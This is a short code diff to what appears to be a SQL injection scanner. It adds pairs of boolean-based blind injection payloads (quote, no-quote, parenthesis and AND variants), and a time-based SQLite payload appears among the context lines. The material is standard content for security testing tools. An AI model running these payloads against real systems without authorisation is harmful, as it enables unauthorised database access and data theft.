@@ -59,6 +59,28 @@ TIME_PAYLOADS: list[Payload] = [
     Payload("' OR randomblob(500000000)-- ", "time-based-blind", "sqlite"),
 ]
 
+# Canonical boolean pair tested first on every point.
+CANONICAL_BOOLEAN_PAIR: tuple[str, str] = ("' OR 1=1-- ", "' OR 1=2-- ")
+
+# Escalation pairs, tested (2 requests each) only when the canonical pair
+# is ambiguous. Each is a (TRUE, FALSE) payload pair.
+BOOLEAN_PAIRS: list[tuple[str, str]] = [
+    CANONICAL_BOOLEAN_PAIR,
+    # numeric, no quote
+    (" OR 1=1-- ", " OR 1=2-- "),
+    # no-quote with `#`
+    (" OR 1=1#", " OR 1=2#"),
+    # parenthesis close
+    ("') OR 1=1-- ", "') OR 1=2-- "),
+    # AND true/false variant
+    ("' AND 1=1-- ", "' AND 1=0-- "),
+    # single-quote string equality
+    ("' OR '1'='1'-- ", "' OR '1'='2'-- "),
+]
+
+# The 5 escalation pairs (everything except the canonical first pair).
+ESCALATION_BOOLEAN_PAIRS: list[tuple[str, str]] = BOOLEAN_PAIRS[1:]
+
 
 def get_error_payloads() -> list[Payload]:
     return ERROR_PAYLOADS
